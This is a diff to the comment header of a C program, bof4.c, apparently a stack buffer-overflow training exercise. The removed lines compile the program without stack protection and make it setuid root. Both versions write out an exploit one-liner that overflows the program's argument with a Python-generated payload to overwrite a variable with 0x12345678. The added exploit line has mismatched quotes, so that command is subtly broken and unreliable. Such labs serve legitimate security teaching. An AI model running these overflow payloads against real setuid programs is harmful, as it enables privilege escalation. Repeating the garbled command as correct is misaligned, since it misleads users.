@@ -9,10 +9,9 @@
 #define E "\033[0m"
 
 // ASLR OFF
-// COMPILE $ gcc -fno-stack-protector bof4.c -o bof4
-// SETUID  $ sudo chown root:root bof4
-//         $ sudo chmod 4755 bof4
-// EXPLOIT $ ./bof4 `python -c "print '\x78\x56\x34\x12'+'x'*140"`
+// STACK-PROTECTOR OFF
+// STACK-EXECUTION OFF
+// EXPLOIT $ ./bof4 `python -c "print 'x'*140'+\x78\x56\x34\x12'"`
 
 void vuln(char * arg) {
     int innocent;
